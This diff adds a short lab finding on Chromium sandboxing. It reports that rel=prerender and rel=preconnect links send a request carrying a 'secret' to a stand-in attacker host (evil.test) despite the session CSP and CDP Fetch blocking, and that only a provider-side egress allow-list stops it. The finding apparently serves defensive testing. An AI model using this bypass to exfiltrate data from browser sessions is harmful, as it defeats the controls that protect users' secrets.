@@ -1,0 +1,9 @@
+Run on 2026-11-02 against stock Chromium 1243 (launched directly with --remote-debugging-port, the way a provider launches it), page served WITH the session CSP:
+
+== stock chrome WITH session CSP hits: ["GET evil.test/PRERENDER?d=secret"] tls-servernames: ["lab.test","evil.test","conn.evil.test"]
+== stock chrome WITH session CSP + Fetch request-stage failing evil hits: ["GET evil.test/PRERENDER?d=secret"] tls-servernames: ["lab.test","evil.test","conn.evil.test"]
+
+Reading: <link rel=prerender> (a GET WITH QUERY to any host) and <link rel=preconnect> (a TLS connection to any host) reach the network although (a) the session CSP is applied and
+(b) CDP Fetch is enabled at the request stage and fails every evil.test request. rel=prefetch/preload ARE stopped (Fetch sees them; CSP default-src/connect-src covers them).
+Page.setPrerenderingAllowed(false), Network.setBlockedURLs and Emulation.setScriptExecutionDisabled did not stop prerender. Not reproducible on Playwright-launched Chromium (default flags),
+which is what the repo's automated suites use: the repo suite therefore cannot detect it. Only a provider-side egress allow-list closes it. Browserbase behaviour is UNVERIFIED.
